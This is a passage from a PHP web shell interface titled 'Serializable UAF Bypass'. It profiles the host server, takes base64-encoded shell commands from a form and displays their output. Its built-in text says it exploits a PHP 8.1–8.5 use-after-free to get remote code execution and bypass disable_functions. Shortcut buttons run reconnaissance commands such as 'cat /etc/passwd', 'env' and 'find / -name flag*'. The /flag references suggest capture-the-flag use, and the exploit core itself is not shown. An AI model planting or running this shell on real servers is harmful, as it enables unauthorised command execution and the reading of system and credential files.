$server   = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '?';
$uid      = function_exists('posix_getuid') ? posix_getuid() : '?';
$gid      = function_exists('posix_getgid') ? posix_getgid() : '?';
$cwd      = dirname(isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : __FILE__);
$df       = @ini_get('disable_functions');
$basedir  = @ini_get('open_basedir') ?: '(none)';
$arch     = php_uname('m');

$compat = (PHP_MAJOR_VERSION == 8 && PHP_MINOR_VERSION >= 1);

$output_b64 = !empty($cmd) ? base64_encode($output) : '';
$cmd_b64    = base64_encode($cmd);

$env_data = base64_encode(json_encode([
    'php' => $php_ver, 'sapi' => $sapi, 'os' => $os, 'arch' => $arch,
    'server' => $server, 'uid' => $uid, 'gid' => $gid, 'cwd' => $cwd,
    'basedir' => $basedir, 'df' => $df, 'compat' => $compat,
]));

$logs_b64 = '';
if (DBG && !empty($logs)) {
    $logs_b64 = base64_encode(json_encode($logs));
}

@ob_end_clean();
header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Serializable UAF Bypass</title>
<style>
:root {
    --bg: #0a0a0a; --fg: #c8c8c8; --accent: #00ff88;
    --red: #ff4455; --yellow: #ffaa00; --blue: #00aaff;
    --border: #1e1e1e; --surface: #111;
}
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: var(--bg); color: var(--fg);
    font: 13px/1.6 'JetBrains Mono', 'Fira Code', Consolas, monospace;
}
.wrap { max-width: 980px; margin: 0 auto; padding: 16px; }

.hd {
    display: flex; align-items: center; gap: 12px;
    padding-bottom: 12px; margin-bottom: 16px;
    border-bottom: 1px solid var(--border);
}
.hd h1 { font-size: 16px; color: var(--accent); font-weight: 600; }
.hd .tag {
    font-size: 10px; padding: 2px 8px; border-radius: 3px;
    background: #0a2a0a; color: var(--accent); border: 1px solid #1a3a1a;
}
.hd .tag.bad { background: #2a0a0a; color: var(--red); border-color: #3a1a1a; }

.env {
    display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
    gap: 1px; background: var(--border); border-radius: 4px;
    overflow: hidden; margin-bottom: 16px; font-size: 11px;
}
.env div { background: var(--surface); padding: 6px 10px; }
.env label { color: #666; margin-right: 6px; }
.env span { color: var(--blue); }

.input-row { display: flex; gap: 8px; margin-bottom: 16px; }
.input-row input[type="text"] {
    flex: 1; background: var(--surface); border: 1px solid var(--border);
    color: var(--accent); padding: 10px 14px; font: inherit; font-size: 14px;
    border-radius: 4px; outline: none; transition: border-color .2s;
}
.input-row input[type="text"]:focus { border-color: var(--accent); }
.input-row button {
    background: var(--accent); color: #000; border: none;
    padding: 10px 24px; font: inherit; font-weight: 700;
    border-radius: 4px; cursor: pointer; white-space: nowrap;
}
.input-row button:hover { filter: brightness(0.9); }

.shortcuts { margin-bottom: 16px; display: flex; flex-wrap: wrap; gap: 6px; }
.shortcuts a {
    font-size: 11px; padding: 3px 10px; border-radius: 3px;
    background: var(--surface); border: 1px solid var(--border);
    color: var(--fg); text-decoration: none; cursor: pointer;
}
.shortcuts a:hover { border-color: var(--accent); color: var(--accent); }

.out-box {
    background: #050505; border: 1px solid var(--border); border-radius: 4px;
    min-height: 280px; max-height: 520px; overflow: auto;
}
.out-hdr {
    padding: 8px 12px; border-bottom: 1px solid var(--border);
    color: #555; font-size: 11px; display: flex; justify-content: space-between;
}
.out-hdr .method { color: var(--accent); }
.out-body { padding: 12px; white-space: pre-wrap; word-break: break-all; font-size: 12px; }
.out-body.ok { color: var(--accent); }
.out-body.fail { color: var(--red); }
.out-body.warn { color: var(--yellow); }
.out-body.idle { color: #333; }

.dbg {
    background: var(--surface); border: 1px solid var(--border); border-radius: 4px;
    padding: 10px; margin-top: 12px; font-size: 10px; color: #555;
    max-height: 280px; overflow: auto;
}
.dbg b { color: #888; }
.dbg .addr { color: var(--blue); }
.dbg .phase { color: var(--yellow); }

.df-box {
    background: var(--surface); border: 1px solid var(--border); border-radius: 4px;
    padding: 10px; margin-bottom: 16px; font-size: 10px; color: #666;
    max-height: 80px; overflow: auto; word-break: break-all;
}
.df-box label { color: var(--red); font-weight: 600; display: block; margin-bottom: 4px; }
</style>
</head>
<body>
<div class="wrap">

<div class="hd">
    <h1>Serializable UAF Bypass</h1>
    <span id="compat-tag" class="tag"></span>
    <span class="tag">PHP 8.1+</span>
    <span id="arch-tag" class="tag"></span>
</div>

<div class="env" id="env-grid"></div>

<div class="df-box" id="df-box" style="display:none">
    <label>disable_functions</label>
    <span id="df-content"></span>
</div>

<form method="POST" id="fm">
<?php if(DBG):?><input type="hidden" name="debug" value="1"><?php endif;?>
<input type="hidden" name="cmd" id="cmd_encoded" value="">
<div class="input-row">
    <input type="text" id="cmd_display"
           placeholder="Enter command (e.g. id, cat /flag, ls -la /)" autofocus>
    <button type="submit">Execute</button>
</div>
</form>

<div class="shortcuts">
<?php
$cmds = array(
    'id', 'whoami', 'uname -a', 'ls -la /', 'cat /etc/passwd',
    'cat /flag', 'find / -name flag* 2>/dev/null', 'env',
    'ls -la /home', 'ps aux', 'ifconfig', 'cat /proc/version',
);
foreach ($cmds as $c):
?>
    <a onclick="_exec('<?=$c?>')"><?=$c?></a>
<?php endforeach;?>
    <a onclick="location.href='?debug=<?=DBG?'0':'1'?>'"
       style="<?=DBG?'color:var(--accent);border-color:var(--accent)':''?>">
       Debug <?=DBG?'ON':'OFF'?>
    </a>
</div>

<div class="out-box">
    <div class="out-hdr">
        <span id="out-cmd">Ready</span>
        <span class="method" id="out-method"></span>
    </div>
    <div class="out-body idle" id="out-body"></div>
</div>

<div class="dbg" id="dbg-box" style="display:none"></div>

</div>
<script>
(function(){
    var _e = '<?=$env_data?>';
    var _o = '<?=$output_b64?>';
    var _c = '<?=$cmd_b64?>';
    var _s = '<?=$status?>';
    var _l = '<?=$logs_b64?>';

    function d(b){ try{ return atob(b); }catch(e){ return ''; } }
    function esc(s){ var t=document.createElement('span'); t.textContent=s; return t.innerHTML; }

    var env = JSON.parse(d(_e));

    // header tags
    var ct = document.getElementById('compat-tag');
    ct.textContent = 'PHP ' + env.php + ' ' + (env.compat ? 'Compatible' : 'NOT SUPPORTED');
    if (!env.compat) ct.classList.add('bad');
    document.getElementById('arch-tag').textContent = env.arch;

    // env grid
    var eg = document.getElementById('env-grid');
    var fields = [
        ['PHP', env.php], ['SAPI', env.sapi], ['OS', env.os], ['Arch', env.arch],
        ['Server', env.server], ['UID/GID', env.uid+'/'+env.gid],
        ['CWD', env.cwd], ['open_basedir', env.basedir]
    ];
    fields.forEach(function(f){
        var div = document.createElement('div');
        div.innerHTML = '<label>'+f[0]+'</label><span>'+esc(f[1])+'</span>';
        eg.appendChild(div);
    });

    // disable_functions
    if (env.df) {
        var db = document.getElementById('df-box');
        db.style.display = '';
        document.getElementById('df-content').textContent = env.df;
    }

    // decode and display command + output
    var cmd = d(_c);
    var outEl = document.getElementById('out-body');
    var cmdEl = document.getElementById('out-cmd');
    var methEl = document.getElementById('out-method');

    if (cmd) {
        document.getElementById('cmd_display').value = cmd;
        cmdEl.textContent = '$ ' + cmd;
        methEl.textContent = '[Serializable var_hash UAF]';
        outEl.className = 'out-body ' + (_s || 'idle');
        outEl.textContent = d(_o);
    } else {
        outEl.textContent = "Waiting for command...\n\nSupported: PHP 8.1 / 8.2 / 8.3 / 8.4 / 8.5 (NTS, *nix)\nExploit: Serializable shared-var_hash UAF → RCE\nBypass: disable_functions via module function entry table";
    }

    // debug log
    if (_l) {
        var logs = JSON.parse(d(_l));
        if (logs && logs.length) {
            var dbg = document.getElementById('dbg-box');
            dbg.style.display = '';
            var html = '<b>Exploit Log (' + logs.length + ' entries):</b><br>';
            logs.forEach(function(l){
                var h = esc(l);
                h = h.replace(/0x[0-9a-f]+/gi, '<span class="addr">$&</span>');
                h = h.replace(/Phase \d+/g, '<span class="phase">$&</span>');
                html += h + '<br>';
            });
            dbg.innerHTML = html;
        }
    }

    // form submit: base64 encode the command
    document.getElementById('fm').addEventListener('submit', function(e){
        var v = document.getElementById('cmd_display').value;
        if (!v) { e.preventDefault(); return; }
        document.getElementById('cmd_encoded').value = btoa(unescape(encodeURIComponent(v)));
    });

    // shortcut helper
    window._exec = function(c){
        document.getElementById('cmd_display').value = c;
        document.getElementById('cmd_encoded').value = btoa(c);
        document.getElementById('fm').submit();
    };
})();
</script>
</body>
</html>
